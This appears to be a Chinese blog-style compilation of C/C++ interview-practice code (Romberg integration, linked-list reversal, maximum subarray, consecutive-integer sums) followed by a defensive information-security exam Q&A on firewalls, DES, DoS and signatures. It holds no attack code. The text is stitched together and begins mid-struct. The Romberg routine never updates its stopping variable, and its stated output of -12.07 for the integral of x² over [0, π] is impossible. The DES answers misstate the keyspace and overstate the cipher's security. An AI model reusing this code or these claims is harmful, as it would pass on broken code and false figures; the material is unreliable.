{
	KeyType key;
	OtherType other_data;
}RecordType;


// All kinds of seek.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "headfile.h"
#include "windows.h"
#include  "conio.h "

#include"WinBase.h"
#include "Psapi.h"

#pragma  once
#pragma  message("Psapi.h --> Linking with Psapi.lib")
#pragma  comment(lib,"Psapi.lib")


int Data[MAX]={0};

void produceData(int a[],int length)       //给数组生成数据，用于随即查找
{
	time_t t;
	srand(time(&t));
	for (int i=0;i<length;i++)
	{
		a[i]=rand()%length;
	}


}

void printData(int a[],int length)		//打印数字，到控制台，每五个换一行
{
	for (int i=0;i<length;i++)
	{
		printf("%8d",a[i]);
		if (0==i%5)
		{
			printf("\n");
		}
	}

}

double showMemoryInfo()   
{   

	double MemorySize;					//单位MB
	HANDLE handle=GetCurrentProcess();   

	PROCESS_MEMORY_COUNTERS pmc;   
	GetProcessMemoryInfo(handle,&pmc,sizeof(pmc)); 
	MemorySize=pmc.WorkingSetSize/1024;

	printf("内存使用:  %8lf \n",MemorySize);	//WorkingSetSize The current working set size, in bytes.

	return MemorySize;

} 

void writeRecordtime(unsigned rTime)//将程序结果运行时间写入文件
{
	FILE *fpRecord=NULL; 

	char *s="your programm running time is:   ";
	char *c="ms   ";

	if((fpRecord=fopen("record.txt","wt+"))==NULL) 

	{ 

		printf("Cannot open file strike any key exit!"); 

		getchar(); 

		exit(1); 

	} 

	fprintf( fpRecord, "%s", s);
	fprintf( fpRecord, "%d", rTime);
	fprintf( fpRecord, "%s", c);

	fprintf( fpRecord, "\n");
	fprintf( fpRecord, "your programm use %fMB size of memory!!!", showMemoryInfo());



	fclose(fpRecord); 


}





int _tmain(int argc, _TCHAR* argv[])
{
	produceData(Data,MAX);
	printData(Data,MAX);

	getchar();

	return 0;
}

 
 
快速求积分办法：
// Integral-romberg方法求积分.cpp : 定义控制台应用程序的入口点。
//
/*
romberg方法求积分
方法也称为逐次分半加速法。它是在梯形公式，simpson公式和newton-cotes公式之间的关系的基础上，
构造出一种加速计算积分的方法。作为一种外推算法，它在不增加计算量的前提下提高了误差的精度。
在等距基点的情况下，用计算机计算积分值通常都采用吧区间逐次分半的方法进行。
这样，前一次分割得到的函数值在分半以后仍然可以被利用，并且易于编程。

运行结果如下：
输入：
0 
3．14159 
输出：Romberg- -12．0703
增加迭代次数或提高精度时，程序运行
得到的结果几乎没有什么变化。可以看到，
和Simpson方法运行的结果基本一致，但
Romberg法速度更快、精度更高


*/

#include "stdafx.h"



#include<iostream>
#include<math.h>
#define epsilon 0.00001
#define COUNT 100
using namespace std;

double fun(double x)
{
	return x*x;
}

double Romberg(double a,double b)
{
	int m ,n;
	double h,x,s,q,ep;
	double p,*R =new double[COUNT];
		
			h=b-a;
			R[0]= h*(fun(a)+ fun(b))/2.0;
			m=1;
			n=1;
			ep=epsilon+1.0;
			while ((ep >= epsilon)&& (m <COUNT))
			{
				p = 0.0;
			{
				for(int i=0;i<n;i++)
				{
					x = a+ (i+0.5)*h ;
					p= p + fun(x);
				}
					p= (R[0]+ h*p)/2.0;
					s = 1.0;
					for(int k=1;k<=m;k++)
					{
						s = 4.0*s;
						q= (s*p-R[k-1])/(s-1.0);
							R[k-1]= p;
							p =q;
					}
					p=fabs(q -R[m-1]);
					m =m + 1;
					R[m-1]= q;
					n = n + n;
					h = h/2.0;
				}
				return (q);
			}
}

int _tmain(int argc, _TCHAR* argv[])
{
	double a,b;
	cout<<"Input a，b：a为下限，b为上限"<<endl;
	cin>>a>>b;
	cout<<"Romberg="<<Romberg(a,b)<<endl;
	system("pause");
	return 0;
}


 
 






找工作时候一般需要准备的算法题目类型，其实参考leetcode和poj或者剑指offer基本能够摆平大部分的题目了



1.图的遍历，BFS、DFS；

2.递归的回溯剪枝；

3.树的建立和遍历；

4.状态的二进制表示，如一列开关的状态，图某行的开关状态。


   数据结构：

1.图的表示：邻接矩阵、邻接表（比如：使用数组表示）；

2.队列（BFS用，比如使用数组表示）；

3.链表，可使用结构体数组表示；
   POJ上类似难度的题目：1011（DFS+回溯剪枝，地址：http://poj.org/problem?id=1011），

                                    1014（DFS），1256（回溯剪枝），1753（棋盘状态用16位二进制数表示）

                                    2312（图的遍历），2531（DFS），3278（BFS穷举），3984（图的遍历，DFS或BFS）。

  如果对解题方法有疑问，可以百度搜索：“poj + 题号”，如“http://www.baidu.com/baidu?wd=POJ+1011”。

1.穷举法题目例子
首先这个题目是找到方阵中，step = n的特定环的最大值：

只要穷举法就ok，写这个题目需要回顾两点，1，模仿poj的标准输入输出。2.二维数组传值，需要降维，这块下标的计算
样例输入：

2
4 3
1 2 3 4
12 13 14 5
11 16 15 6
10 9 8 7
3 3
0 0 0
0 0 0
0 0 0输出：


92
0


// KDonuts.cpp : 定义控制台应用程序的入口点。
//


#include <stdio.h>
#include <malloc.h>

/*

To read numbers	int n;
while(scanf("%d", &n) != EOF)
{
　 ...
}

To read characters	int c;
while ((c = getchar()) != EOF)
{
	...
}

To read lines	
char line[1024];
while(gets(line))
{
	...
}
*//////



//只是从当前x,y 坐标的一个环的sum
int getSum(int startX,int startY,int* array,int step,int nlength)
{
	int sum = 0;
	
	for (int i = startY;i < startY+step;i++)
	{
		sum = sum + *(array + startX*nlength + i);
		sum = sum + *(array + (startX +step-1)*nlength +i);
	}
	
	for (int j = startX; j< startX +step - 2;j++)
	{
		sum = sum + *(array+(j +1)*nlength + startY);
		sum = sum + *(array+(j +1)*nlength+ startY + step -1);
	}

	return sum;
}

int getMax(int nlength,int step,int* array )
{
	int maxsum = 0;

	for (int i = 0;i<=nlength-step;i++)
	{

		for (int j = 0;j<=nlength-step;j++)
		{
			int tmp = getSum(i,j,array,step,nlength);
			if (maxsum<tmp)
			{
				maxsum = tmp;
			}
		}
	}
	return maxsum;
}


int main()
{

	freopen("sample.in", "r", stdin);
	freopen("sample.out", "w", stdout);

	/* 同控制台输入输出 */

	int mainIndex = 0;
	scanf("%d",&mainIndex);

	for (int i = 0; i < mainIndex;i++)
	{
		int step = 0;
		int N = 0;
		scanf("%d %d",&N,&step);
		// 下面申请内存时候要用sizeof不然free时候会算错导致堆出错
		int *array = (int*)malloc(sizeof(int)*N*N);
		for (int j = 0;j<N*N;j++)
		{
			scanf("%d",array+j);
		}
		printf("%d\n",getMax(N,step,array));

		free(array);
	}

	
	fclose(stdin);
	fclose(stdout);

	return 0;
}

2.各大公司最常考的题目：关于单链表的逆置

// LinkListReverse.cpp : 定义控制台应用程序的入口点。
//

#include<stdio.h>
//#include<stdlib.h>
#include <malloc.h>
/*链表节点定义*/
typedef struct Lnode
{
	int data;
	struct Lnode *next;
}Lnode, *LinkList;         //定义节点，头指针类型名

/*尾插法创建单链表*/
void Create_LinkList_B(LinkList &L)
{
	int x, cycle = 1;
	Lnode *p, *s;
	L=(LinkList)malloc(sizeof(Lnode)); //生成头结点
	L->next = NULL;
	p=L;
	while(cycle)    //循环接受输入节点数据，-1结束输入
	{
		printf("x = ?\n");
		scanf("%d", &x);
		if(x != -1)
		{
			s=(Lnode *)malloc(sizeof(Lnode)); //生成新节点
			s->data = x;
			p->next = s;        //把新节点插入链表尾部
			p = s;	        	//p指针再次指向尾节点
		}
		else
		{
			cycle = 0;    //输入-1，改变循环变量，不接受新节点
		}

	}
	p->next = NULL;
}

/*单链表的逆置，针对有头节点的情况 ，没有头节点的情况另外补上一个头结点*/
void Reverse_LinkList(LinkList &L)
{
	if( (NULL==L)||(NULL==L->next) )return ;  //边界检测  
	Lnode *pre, *q;//pre节点一直作为去掉头结点的链表的首节点，q作为保存pre的临时节点
	pre = L->next;    //P指向链表第一个元素
	L->next = NULL; //断开头结点与链表
	while(pre != NULL)
	{
		q = pre;
		pre = pre->next;
		q->next = L->next;  //相当于前插法构建新的链表，和原来的相反
		L->next = q;
	}
}
//单链表逆置的递归写法：
void ReverseList(LinkList& pCur,LinkList& ListHead)
{
	if( (NULL==pCur)||(NULL==pCur->next) )
	{
		ListHead=pCur;
	}
	else
	{
		LinkList pNext=pCur->next;
		ReverseList(pNext,ListHead); //递归逆置后继结点
		pNext->next=pCur;            //将后继结点指向当前结点。
		pCur->next=NULL;
	}
}

/*打印单链表*/
void Print_LinkList(LinkList &L)
{	
	Lnode* p;
	p = L->next;		//L是头指针，p指向第一个节点，开始打印
	while(p != NULL)
	{
		printf("%d\n", p->data);
		p = p->next;
	}
}

/*测试函数*/
int main()
{
	LinkList H;	  //声明头指针
	Create_LinkList_B(H);
	printf("现在开始打印链表\n");
	Print_LinkList(H);

	printf("-----逆置之后的链表-----\n");

	Reverse_LinkList(H);
	Print_LinkList(H);
	printf("-----逆置之后的链表-----\n");
	ReverseList(H,H);
	Print_LinkList(H);
	return 0;
}



这个哥们的代码基本可以作为标准答案了：
http://blog.csdn.net/heyabo/article/details/7610732







题目：输入一个正整数，若该数能用几个连续正整数之和表示，则输出所有可能的正整数序列。
一个正整数有可能可以被表示为n(n>=2)个连续正整数之和，如： 
15=1+2+3+4+5 
15=4+5+6 
15=7+8
有些数可以写成连续N（>1）个自然数之和，比如14=2+3+4+5；有些不能，比如8.那么如何判断一个数是否可以写成连续N个自然数之和呢？
一个数M若可以写成以a开头的连续n个自然数之和，则M=a+(a+1)+(a+2)+…+(a+n-1)=n*a+n*(n-1)/2，要求a!=0，否则就是以a+1开头的连续n-1个整数了，也就是要求(M-n*(n-1)/2)%n==0，这样就很容易判断一个数可不可以写成连续n个自然数的形式了，遍历n=2…sqrt(M)*2，还可以输出所有解。

void divide(int num)  
{  
    int i,j,a;  
    for(i=2; i<=sqrt((float)num)*2; ++i)  
    {  
        if((num-i*(i-1)/2)%i==0)  
        {  
            a=(num-i*(i-1)/2)/i;  
            if(a>0)  
            {  
                for(j=0; j<i; ++j)  
                    cout<<a+j<<" ";  
            }  
            cout<<endl;  
        }  
    }   
}  

第二个问题是什么样的数可以写成连续n个自然数之和，什么样的数不能？
通过编程实验发现，除了2^n以外，其余所有数都可以写成该形式。下面说明为什么。 
若数M符合条件，则有M=a+(a+1)+(a+2)+…+(a+n-1)=(2*a+n-1)*n/2，而2*a+n-1与n肯定一个为奇数一个为偶数，即M一定要有一个奇数因子，而所有2^n都没有奇数因子，因此肯定不符合条件。
再证明只有M有一个奇数因子，即M!=2^n，M就可以写成连续n个自然数之和。假设M有一个奇数因子a，则M=a*b。
若b也是奇数，只要b-(a-1)/2>0，M就可以写成以b-(a-1)/2开头的连续a个自然数；将这条结论里的a和b调换，仍然成立。15=3*5=1+2+3+4+5=4+5+6.若b是偶数，则我们有一个奇数a和一个偶数b。2.1 若b-(a-1)/2>0，M就可以写成以b-(a-1)/2开头的连续a个自然数。24=3*8=7+8+9. 2.2 若(a+1)/2-b>0，M就可以写成以(a+1)/2-b开头的连续2*b个自然数。38=19*2=8+9+10+11.上述两个不等式必然至少有一个成立，所以可以证明，只要M有一个奇数因子，就一定可以写成连续n个自然数之和。
另一个正整数分解的算法： 
sum(i,j)为i累加到j的和  
令 i=1 j=2  
if sum(i,j)>N i++  
else if sum(i,j)<N j++  
else cout i...j 
参考代码：

#include <iostream>   
using namespace std;  
  
int add(int m,int n)  
{  
    int sum=0;  
    for(int i=m;i<=n;i++)  
        sum+=i;  
    return sum;  
}  
  
void divide(int num)  
{  
    int i=1,j=2,flag;  
    int sum=0;  
    while(i<=num/2)  
    {  
     sum=add(i,j);  
     while(sum!=num)  
     {  
        if(sum>num)  
            i++;  
        else  
            j++;  
        sum=add(i,j);  
     }  
     for(int k=i;k<=j;k++)  
        cout<<k<<" ";  
     ++i;  
     cout<<endl;  
    }  
}  
  
int main()  
{  
    int num;  
    cout<<"Please input your number:"<<endl;  
    cin>>num;  
    divide(num);  
    return 0;  
}  







上代码先：
问题代码来源：http://blog.csdn.net/v_JULY_v
 
 
// MaxSum.cpp : 定义控制台应用程序的入口点。
//
//copyright@ July
//July、updated，2011.05.25。


#include "stdafx.h"
#include <iostream> 
using namespace std;

int maxsum(int a[], int n)
{
	int max = a[0];//全负情况，返回最大数
	int sum = 0;
	for (int j = 0; j< n; j++)
	{
		if (sum >= 0)
			sum = sum + a[j];	//如果加上某个元素，sum>=0 的话，就加
		
		else
			sum = a[j];		//如果加上某个元素，sum<0 了，就不加
		
		if(sum > max)
			max = sum;
		
	}

	return max;

}


//Algorithm 4:时间效率为O(n)
//同上述第一节中的思路3、和4。
//《Data structures and Algorithm analysis in C》中实现。
int MaxSubsequenceSum(const int A[],int N)
{
	int ThisSum,MaxSum,j;
	ThisSum=MaxSum=0;
	for(j=0;j<N;j++)
	{
		ThisSum+=A[j];
		if(ThisSum>MaxSum)
			MaxSum=ThisSum;
		else if(ThisSum<0)
			ThisSum=0;
	}
	return MaxSum;
}

int main()
{
	int a[]={-1,-2,-3,-4,10,1,-3};

	cout<<maxsum(a,7)<<endl;
	cout<<MaxSubsequenceSum(a,7)<<endl;
	
	getchar();
	return 0;
}



 






1. 名词解释

APT
高级持续性威胁。利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。其高级性主要体现在APT在发动攻击之前需要对攻击对象的业务流程和目标系统进行精确的收集。
VPN
虚拟专用网络（Virtual private network）
VPN是Virtual PrivateNetwork的缩写，是将物理分布在不同地点的网络通过公用骨干网，尤其是Internet连接而成的逻辑上的虚拟子网。
Virtual是针对传统的企业“专用网络”而言的。VPN则是利用公共网络资源和设备建立一个逻辑上的专用通道，尽管没有自己的专用线路，但它却可以提供和专用网络同样的功能。
Private表示VPN是被特定企业或用户私有的，公共网络上只有经过授权的用户才可以使用。在该通道内传输的数据经过了加密和认证，保证了传输内容的完整性和机密性。
SSL
SSL(Secure Sockets Layer 安全套接层), 
为网络通信提供安全及数据完整性的一种安全协议。
ICMP
Internet控制报文协议。它是TCP/IP协议族的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。
HTTPS
是以安全为目标的HTTP通道，简单讲是HTTP的安全版。https
SYN Flood
就是一种DOS攻击。
SYN Flood是当前最流行的DoS（拒绝服务攻击）与DDoS（分布式拒绝服务攻击）的方式之一，这是一种利用TCP协议缺陷，发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽（CPU满负荷或内存不足）的攻击方
IDS
入侵检测系统IDS，它从计算机网络系统中的若干关键点收集信息，并分析这些信息，检查网络中是否有违反安全策略的行为和遭到袭击的迹象。入侵检测被认为是防火墙之后的第二道安全闸门。
1）监测并分析用户和系统的活动，查找非法用户和合法用户的越权操作；

2）核查系统配置和漏洞并提示管理员修补漏洞；

3）评估系统关键资源和数据文件的完整性；

4）识别已知的攻击行为，统计分析异常行为；

5）操作系统日志管理，并识别违反安全策略的用户活动等。

网络蠕虫
网络蠕虫是一种可以通过网络（永久连接网络或拨号网络）进行自身复制的病毒程序。一旦在系统中激活，蠕虫可以表现得象计算机病毒或细菌。可以向系统注入特洛伊木马程序，或者进行任何次数的破坏或毁灭行动。普通计算机病毒需要在计算机的硬件或文件系统中繁殖，而典型的蠕虫程序会在内存中维持一个活动副本。蠕虫是一个独立运行的程序，自身不改变其他的程序，但可以携带一个改变其他程序功能的病毒。
中间人攻击
中间人攻击（Man-in-the-MiddleAttack，简称“MITM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。 
 


2.简答题

1.简述DOS和DDOS的区别
答：DOS意思是 Denial of service 
的缩写，也就是网络产生的初期，用一台高配的设备去攻击一台低配的设备，造成被攻击的设备死机
DDOS意思是 Distributed Denial of service 
的缩写，随着技术的进步，IT设备的配置都在飞速增长，DOS的方式已经变的水土不服，那就产生了分布式的DOS，形象的说就是我一个人打不过你，那我可以多叫几个兄弟过来揍你，我可以雇佣很多打手，（也就是控制很多傀儡机）这样的攻击就是DDOS
2.信息安全的基本属性主要表现在哪几个方面?
答：
（1）完整性（Integrity）

（2）保密性（Confidentiality）

（3）可用性（Availability）

（4）不可否认性（Non-repudiation）

（5）可控性（Controllability）

3、PMI与PKI的区别主要体现在哪些方面？
答：PKI证明用户是谁，并将用户的身份信息保存在用户的公钥证书中；
PMI证明这个用户有什么权限，什么属性，能干什么，并将用户的属性信息保存在授权证书中。
4、请回答数据容灾的四个层次？
第0级 本地备份、保存的冷备份

第1级 本地备份和异地保存的冷备份

第2级 热备份站点备份

第3级 活动互援备份

5、请简述网站保护的方法？
答：
方法一：提高网站代码的质量，对客户端输入的内容做好检测和过滤。
方法二：部署WEB防火墙（WAF产品），用设备来替代程序做好检测和过滤。
6、什么是数字签名？并简述数字签名与数字签名验证有何区别？
数字签名技术是将摘要信息用发送者的私钥加密，与原文一起传送给接收者。接收者只有用发送者的公钥才能解密被加密的摘要信息，然后用HASH函数对收到的原文产生一个摘要信息，与解密的摘要信息对比。
如果相同，则说明收到的信息是完整的，在传输过程中没有被修改，否则说明信息被修改过，因此数字签名能够验证信息的完整性。
数字签名是个加密的过程，数字签名验证是个解密的过程。
7、什么是非对称密码算法？
答：
非对称密码算法是指加密和解密数据使用两个不同的密钥，即加密和解密的密钥是不对称的。
8、请简述防火墙的缺陷。
答：
（1）防火墙不能防止内部攻击

（2）防火墙不能防止未经过防火墙的攻击

（3）防火墙不能取代杀毒软件

（4）防火墙不易防止反弹端口木马攻击

9、请简述一般网络攻击的步骤及过程
答：
（1）隐藏自己的位置；

（2）寻找目标主机并分析目标主机

（3）获取账号和密码

（4）获得控制权

（5）获取网络资源和特权

 10、xxx网络安全事件带给我国的启示与对策？
(如：勒索病毒)
近年来，我国已经成为全球网络安全威胁的最大受害者之一。为了减少损害，并提升我国网络安全技术水平，我认为应推进以下几项措施：

依据《中华人民共和国网络安全法》构建更加全方位的网络安全管理与预警措施。力争在网络安全威胁还未全面爆发前就采取有效行动，做到防患于未然。
加强网络安全宣传教育，提升每个人的网络安全意识。
努力实现关键技术上的技术自主，如操作系统，核心交换机，加密算法等。对于尚不能实现技术自主的信息系统，应当加强风险评估、分级管理，做到系统安全可控。
加强国际合作，特别是加强全球范围内的网络安全共同治理，共同应对跨国信息安全问题。

11、什么是入侵检测系统？
答：
入侵检测系统（简称“IDS”）是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。
它与其他网络安全设备的不同之处便在于，IDS是一种积极主动的安全防护技术。 
IDS最早出现在1980年4月。 1980年代中期，IDS逐渐发展成为入侵检测专家系统（IDES）。
12、请说明DES算法的基本过程？
答：
DES加密算法特点：分组比较短、密钥太短、密码生命周期短、运算速度较慢。
DES工作的基本原理是，其入口参数有三个:key、data、mode。
key为加密解密使用的密钥，data为加密解密的数据，mode为其工作模式。当模式为加密模式时，明文按照64位进行分组，形成明文组，key用于对数据加密，当模式为解密模式时，key用于对数据解密。实际运用中，密钥只用到了64位中的56位，这样才具有高的安全性。
13、信息安全有哪些常见的威胁？信息安全的实现有哪些主要技术措施？
答：
常见威胁有非授权访问、信息泄露、破坏数据完整性，拒绝服务攻击，恶意代码。信息安全的实现可以通过物理安全技术，系统安全技术，网络安全技术，应用安全技术，数据加密技术，认证授权技术，访问控制技术，审计跟踪技术，防病毒技术，灾难恢复和备份技术。
14、什么是密码分析，其攻击类型有哪些？DES算法中S盒的作用是什么？
答：
密码分析是指研究在不知道密钥的情况下来恢复明文的科学。攻击类型有只有密文的攻击，已知明文的攻击，选择明文的攻击，适应性选择明文攻击，选择密文的攻击，选择密钥的攻击，橡皮管密码攻击。S盒是DES算法的核心。其功能是把6bit数据变为4bit数据。
15、什么事通信网络安全？涉及哪些方面？
答：
通信网络安全保护网络系统的硬件、软件、数据及通信过程，不应偶然或恶意原因遭到破坏、更改和泄漏，保证系统连续可靠正常地运行，保证网络服务不中断。
涉及通信网络上信息的机密性、完整性、可用性、真实性、可控性，要求具有抵御各种安全威胁能力。
16、密码体制分类
答：
（1）对称加密算法

加密密钥和解密密钥相同或等价的，且都需要保密。DES IDEA FEAL-8 LOKI。 
    优点：加密算法简单、高效、密钥简短，破译极其困难。缺点：密钥必须通过安全的途径传送。
（2）非对称密码体制

（公钥、收信方和发信方使用的密钥互不相同，而且几乎不可能从加密密钥推导出解密密钥）RSA。 
优点：可以适应网络的开放要求，且密钥管理问题也较为简单，方便地实现数字签名和验证。缺点：算法复杂，加密数据的速率较低。
17、包过滤基本特点和工作原理？
答：
基本特点：
可以让我们在一台机器上提供对整个网络的保护。
工作原理：
包过滤是一种安全机制，它控制哪些数据包可以进出网络，而哪些数据包应被网络拒绝。* 
包过滤路由器是具有包过滤特性的一种路由器。在对包做出路由决定时，普通路由器只依据包的目的地址引导包，而*包过滤路由器就必须依据路由器中的包过滤规则做出是否引导该包的决定。
18、代理服务器作用？
答：
代理，也称为应用级网关，是一个提供替代连接并且充当服务的网关。代理服务是运行在防火墙主机上的一些特定应用程序或者服务程序。
代理服务位于内部用户（在内部的网络上）和外部服务（在因特网上）之间。
代理在后台处理所有用户和因特网服务之间的通信以代替相互间的直接交谈。代理服务器可使得一些不能访问因特网的主机通过代理服务也可以完成访问因特网的工作。
19．简述主动攻击与被动攻击的特点，并列举主动攻击与被动攻击现象。
主动攻击 是攻击者通过网络线路将虚假信息或计算机病毒传入信息系统内部，破坏信息的真实性、完整性及系统服务的可用性，即通过中断、伪造、篡改和重排信息内容造成信息破坏，使系统无法正常运行。
被动攻击是攻击者非正常截获、窃取通信线路中的信息，使信息保密性遭到破坏，信息泄露而无法察觉，给用户带来巨大的损失。
20．简述对称密钥密码体制的原理和特点。
对称密钥密码体制，对于大多数算法，解密算法是加密算法的逆运算，加密密钥和解密密钥相同，同属一类的加密体制。它保密强度高但开放性差，要求发送者和接收者在安全通信之前，需要有可靠的密钥信道传递密钥，而此密钥也必须妥善保管。
21. 常规加密密钥的分配有几种方案，请对比一下它们的优缺点。
（1）集中式密钥分配方案

由一个中心节点或者由一组节点组成层次结构负责密钥的产生并分配给通信的双方，在这种方式下，用户不需要保存大量的会话密钥，只需要保存同中心节点的加密密钥，用于安全传送由中心节点产生的即将用于与第三方通信的会话密钥。这种方式缺点是通信量大，同时需要较好的鉴别功能以鉴别中心节点和通信方。目前这方面主流技术是密钥分配中心KDC技术。我们假定每个通信方与密钥分配中心KDC之间都共享一个惟一的主密钥，并且这个惟一的主密钥是通过其他安全的途径传递。
（2）分散式密钥分配方案

使用密钥分配中心进行密钥的分配要求密钥分配中心是可信任的并且应该保护它免于被破坏。如果密钥分配中心被第三方破坏，那么所有依靠该密钥分配中心分配会话密钥进行通信的所有通信方将不能进行正常的安全通信。如果密钥分配中心被第三方控制，那么所有依靠该密钥分配中心分配会话密钥进行进信的所有通信方之间的通信信息将被第三方窃听到
22. 密钥的产生需要注意哪些问题？
算法的安全性依赖于密钥，如果用一个弱的密钥产生方法，那么整个系统都将是弱的。DES有56位的密钥，正常情况下任何一个56位的数据串都能成为密钥，所以共有256种可能的密钥。在某些实现中，仅允许用ASCII码的密钥，并强制每一字节的最高位为零。有的实现甚至将大写字母转换成小写字母。这些密钥产生程序都使得DES的攻击难度比正常情况下低几千倍。因此，对于任何一种加密方法，其密钥产生方法都不容忽视。
大部分密钥生成算法采用随机过程或者伪随机过程来生成密钥。
随机过程一般采用一个随机数发生器，它的输出是一个不确定的值。伪随机过程一般采用噪声源技术，通过噪声源的功能产生二进制的随机序列或与之对应的随机数。
23. 请说明数字签名的主要流程。
数字签名通过如下的流程进行：

(1)采用散列算法对原始报文进行运算，得到一个固定长度的数字串，称为报文摘要(Message Digest)，不同的报文所得到的报文摘要各异，但对相同的报文它的报文摘要却是惟一的。在数学上保证，只要改动报文中任何一位，重新计算出的报文摘要值就会与原先的值不相符，这样就保证了报文的不可更改性。
(2) 发送方用目己的私有密钥对摘要进行加密来形成数字签名。
(3) 这个数字签名将作为报文的附件和报文一起发送给接收方。
(4)接收方首先对接收到的原始报文用同样的算法计算出新的报文摘要，再用发送方的公开密钥对报文附件的数字签名进行解密，比较两个报文摘要，如果值相同，接收方就能确认该数字签名是发送方的，否则就认为收到的报文是伪造的或者中途被篡改。

24、解释身份认证的基本概念。
身份认证是指用户必须提供他是谁的证明，这种证实客户的真实身份与其所声称的身份是否相符的过程是为了限制非法用户访问网络资源，它是其他安全机制的基础。
身份认证是安全系统中的第一道关卡，识别身份后，由访问监视器根据用户的身份和授权数据库决定是否能够访问某个资源。一旦身份认证系统被攻破，系统的所有安全措施将形同虚设，黑客攻击的目标往往就是身份认证系统。
25. 使用口令进行身份认证的优缺点？
优点在于黑客即使得到了口令文件，通过散列值想要计算出原始口令在计算上也是不可能的，这就相对增加了安全性。缺点：严重的安全问题（单因素的认证），安全性仅依赖于口令，而且用户往往选择容易记忆、容易被猜测的口令（安全系统最薄弱的突破口），口令文件也可被进行离线的字典式攻击。
26. 有哪些生物特征可以作为身份认证的依据，这种认证的过程是怎样的？
以人体唯一的、可靠的、稳定的生物特征（如指纹、虹膜、脸部、掌纹等）为依据，采用计算机强大的计算功能和网络技术进行图象处理和模式识别。该技术具有很好的安全性、可靠性和有效性。
所有的工作有4个步骤：抓图、抽取特征、比较和匹配。生物捕捉系统捕捉到生物特征的样品，唯一的特征将会被提取并且被转化成数字符号，这些符号被存成那个人的特征摸板，人们同识别系统交互进行身份认证，以确定匹配或不匹配授权与访问控制
27. 电子邮件存在哪些安全性问题？

1）垃圾邮件包括广告邮件、骚扰邮件、连锁邮件、反动邮件等。垃圾邮件会增加网络负荷，影响网络传输速度，占用邮件服务器的空间。
2）诈骗邮件通常指那些带有恶意的欺诈性邮件。利用电子邮件的快速、便宜，发信人能迅速让大量受害者上当。
3）邮件炸弹指在短时间内向同一信箱发送大量电子邮件的行为，信箱不能承受时就会崩溃。
4）通过电子邮件传播的病毒通常用VBScript编写，且大多数采用附件的形式夹带在电子邮件中。当收信人打开附件后，病毒会查询他的通讯簿，给其上所有或部分人发信，并将自身放入附件中，以此方式继续传播扩散。

28. 什么是防火墙，为什么需要有防火墙？
防火墙是一种装置，它是由软件/硬件设备组合而成，通常处于企业的内部局域网与Internet之间，限制Internet用户对内部网络的访问以及管理内部用户访问Internet的权限。换言之，一个防火墙在一个被认为是安全和可信的内部网络和一个被认为是不那么安全和可信的外部网络(通常是Internet)之间提供一个封锁工具。
如果没有防火墙，则整个内部网络的安全性完全依赖于每个主机，因此，所有的主机都必须达到一致的高度安全水平，这在实际操作时非常困难。而防火墙被设计为只运行专用的访问控制软件的设备，没有其他的服务，因此也就意味着相对少一些缺陷和安全漏洞，这就使得安全管理变得更为方便，易于控制，也会使内部网络更加安全。
防火墙所遵循的原则是在保证网络畅通的情况下，尽可能保证内部网络的安全。它是一种被动的技术，是一种静态安全部件。
29. 防火墙应满足的基本条件是什么？
作为网络间实施网间访问控制的一组组件的集合，防火墙应满足的基本条件如下：
(1) 内部网络和外部网络之间的所有数据流必须经过防火墙。

(2) 只有符合安全策略的数据流才能通过防火墙。

(3) 防火墙自身具有高可靠性，应对渗透(Penetration)免疫，即它本身是不可被侵入的。

30. 列举防火墙的几个基本功能？

(1)隔离不同的网络，限制安全问题的扩散，对安全集中管理，简化了安全管理的复杂程度。
(2)防火墙可以方便地记录网络上的各种非法活动，监视网络的安全性，遇到紧急情况报警。
(3)防火墙可以作为部署NAT的地点，利用NAT技术，将有限的IP地址动态或静态地与内部的IP地址对应起来，用来缓解地址空间短缺的问题或者隐藏内部网络的结构。
(4) 防火墙是审计和记录Internet使用费用的一个最佳地点。
(5) 防火墙也可以作为IPSec的平台。
(6)内容控制功能。根据数据内容进行控制，比如防火墙可以从电子邮件中过滤掉垃圾邮件，可以过滤掉内部用户访问外部服务的图片信息。只有代理服务器和先进的过滤才能实现。

31、防火墙有哪些局限性？
(1) 网络上有些攻击可以绕过防火墙（如拨号）。

(2) 防火墙不能防范来自内部网络的攻击。

(3) 防火墙不能对被病毒感染的程序和文件的传输提供保护。

(4) 防火墙不能防范全新的网络威胁。

(5) 当使用端到端的加密时，防火墙的作用会受到很大的限制。

(6) 防火墙对用户不完全透明，可能带来传输延迟、瓶颈以及单点失效等问题。

(7)防火墙不能防止数据驱动式攻击。有些表面无害的数据通过电子邮件或其他方式发送到主机上，一旦被执行就形成攻击（附件）。

32、包过滤防火墙的过滤原理是什么？
包过滤防火墙也称分组过滤路由器，又叫网络层防火墙，因为它是工作在网络层。路由器便是一个网络层防火墙，因为包过滤是路由器的固有属性。它一般是通过检查单个包的地址、协议、端口等信息来决定是否允许此数据包通过，有静态和动态两种过滤方式。
这种防火墙可以提供内部信息以说明所通过的连接状态和一些数据流的内容，把判断的信息同规则表进行比较，在规则表中定义了各种规则来表明是否同意或拒绝包的通过。包过滤防火墙检查每一条规则直至发现包中的信息与某规则相符。如果没有一条规则能符合，防火墙就会使用默认规则（丢弃该包）。在制定数据包过滤规则时，一定要注意数据包是双向的。
33、静态包过滤和动态包过滤有什么不同？
静态包过滤在遇到利用动态端口的协议时会发生困难，如FTP，防火墙事先无法知道哪些端口需要打开，就需要将所有可能用到的端口打开，会给安全带来不必要的隐患。
而状态检测通过检查应用程序信息(如FTP的PORT和PASV命令)，来判断此端口是否需要临时打开，而当传输结束时，端口又马上恢复为关闭状态。
34. 试述RAID 0、RAID 1、RAID 3、RAID 5方案。

（1）RAID0—-无冗余、无校验的磁盘阵列。 
  RAID0至少使用两个磁盘驱动器，并将数据分成从512字节到数兆节的若干块（数据条带），这些数据块被交替写到磁盘中。RAID0不适用于对可靠性要求高的关键任务环境，但却非常适合于对性能要求较高的视频或图像编辑。
（2）RAID1：镜像磁盘阵列。 
